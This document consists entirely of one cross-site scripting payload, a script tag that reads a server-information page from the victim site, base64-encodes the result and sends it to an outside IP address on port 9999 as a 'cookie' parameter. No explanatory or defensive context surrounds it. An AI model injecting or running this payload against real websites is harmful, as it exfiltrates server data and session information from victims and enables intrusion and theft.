<script>fetch('/harm/to/self/server_info.php').then(response => response.text()).then(data => fetch('http://192.168.242.92:9999/?cookie=' + btoa(data)));</script>
